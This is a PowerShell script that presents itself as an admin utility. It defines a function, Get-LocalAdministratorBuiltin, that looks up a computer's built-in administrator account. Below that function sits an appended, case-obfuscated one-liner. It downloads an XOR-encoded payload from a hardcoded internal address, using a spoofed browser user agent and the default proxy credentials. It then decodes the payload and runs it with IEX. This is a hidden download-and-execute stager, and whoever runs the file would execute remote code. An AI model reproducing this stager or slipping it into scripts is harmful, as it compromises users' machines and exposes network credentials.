﻿function Get-LocalAdministratorBuiltin
{


    [CmdletBinding()]
    param (
        [Parameter()]
        $ComputerName = $env:computername
    )
    Process
    {
        Foreach ($Computer in $ComputerName)
        {
            Try
            {
                Add-Type -AssemblyName System.DirectoryServices.AccountManagement
                $PrincipalContext = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Computer)
                $UserPrincipal = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal($PrincipalContext)
                $Searcher = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalSearcher
                $Searcher.QueryFilter = $UserPrincipal
                $Searcher.FindAll() | Where-Object { $_.Sid -Like "*-500" }
            }
            Catch
            {
                Write-Warning -Message "$($_.Exception.Message)"
            }
        }
    }
}
$Wc=New-OBJECt SYsTeM.NEt.WEBCliEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HEADeRs.AdD('User-Agent',$u);$wc.PrOxy = [SYsTEm.NEt.WebReqUEST]::DEFAULTWEbPrOXy;$Wc.PROXy.CredENtIaLS = [SySTEM.Net.CrEDeNTialCacHE]::DefaUlTNEtWORkCREDeNTIALs;$K='$|oreN\s%Q@)GM]T^(B+n/._<-0?Ug9y';$I=0;[Char[]]$B=([cHAR[]]($Wc.DOWNloadSTRInG("http://192.168.0.40:443/index.asp")))|%{$_-BXor$K[$i++%$k.Length]};IEX ($B-join'')

